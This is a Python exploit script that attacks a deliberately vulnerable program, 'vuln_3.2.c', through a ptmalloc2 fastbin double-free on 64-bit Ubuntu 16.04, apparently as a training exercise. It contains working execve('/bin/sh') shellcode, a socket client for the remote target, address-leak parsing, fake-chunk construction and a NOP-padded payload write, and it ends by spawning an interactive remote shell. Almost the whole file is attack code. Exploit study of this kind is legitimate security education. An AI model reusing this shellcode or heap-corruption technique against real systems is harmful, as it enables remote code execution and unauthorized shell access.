#!/usr/bin/python

#
# What: Exploit for vuln_3.2.c in ptmalloc2-ubuntu-16.04.4-64bit
# Author: Claes M. Nyberg
# When: Summer 2018
#

import struct
import socket
import sys
import os
import telnetlib
import random
import hashlib
import base64
import binascii

#
# Linux amd64 shellcode 
# execve('/bin/sh', ['/bin/sh', NULL], NULL) 
#
code = "\x48\xba\x2f\x2f\x62\x69"  # movabs $0x68732f6e69622f2f,%rdx
code += "\x6e\x2f\x73\x68"
code += "\x48\xc1\xea\x08"          # shr    $0x8,%rdx
code += "\x52"                      # push   %rdx
code += "\x48\x89\xe7"              # mov    %rsp,%rdi
code += "\x48\x31\xd2"              # xor    %rdx,%rdx
code += "\x52"                      # push   %rdx
code += "\x57"                      # push   %rdi
code += "\x48\x89\xe6"              # mov    %rsp,%rsi
code += "\x6a\x3b"                  # pushq  $0x3b
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 
code += "\x6a\x3c"                  # pushq  $0x3c
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 


def readuntil(s, content, echo = True):
	x = ""
	while True:
		y = s.recv(1)
		if not y:
			sys.stderr.write('[**] Error: FAILED TO READ FROM SOCKET\n')
			if echo:
				sys.stderr.write(x)
			return False
		x += y
		if x.endswith(content):
			if echo:
				sys.stderr.write(x)
			return x
		
def interact(sock):
	t = telnetlib.Telnet()                                                        
	t.sock = sock                                                                    
	t.interact()

def tcpconn(host, port, lport=0):
	target = (host, port)
	sock = socket.socket()
	bound = ''

	if lport != 0:
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind(("", int(lport)))
		bound = " (from local port " + str(lport) + ")"

	print("[+] Connecting to " + target[0] + ":" + str(target[1]) + bound)
	try:
		sock.connect(target)
	except socket.error, msg:
		print("[**] Error: Failed to connect: " + str(msg))
		sys.exit(1)	
	return sock


if len(sys.argv) != 3:
	print "Usage: " + sys.argv[0] + " <ip> <port>"
	sys.exit(0)

s = tcpconn(sys.argv[1], int(sys.argv[2]), 0)

#import time
#time.sleep(10)

#-#-#-#-#-#-#-#-#-#-# Fun Stuff Goes Below


print("[+] Using shellcode of %d bytes" %(len(code)))

# Send fast bin malloc size
malloc_size = 0x70-8
s.send(struct.pack("<Q", int(malloc_size)))

# Read the address where the chunk size is stored
leak = int(readuntil(s, "\n"), 16)
print("[+] Chunk size at 0x%x" %(leak))

# Send address to our fake chunk
# which will be set as the forward pointer in 
# the chunk that was double free'd
fake_chunk = leak - 8 # 8 bytes before chunk size
print("[+] Using fake chunk at 0x%x" %(fake_chunk))
s.send(struct.pack("<Q", fake_chunk))

ret_addr = leak + 24 + 16
print("[+] Using return address 0x%x" %(ret_addr))

# Send data to overwrite memory
# where the fake chunk resides
s.send(struct.pack("<Q", ret_addr)*4 + code.rjust(36, '\x90') + '\n')

s.send("id\n")
interact(s)
sys.exit(0)


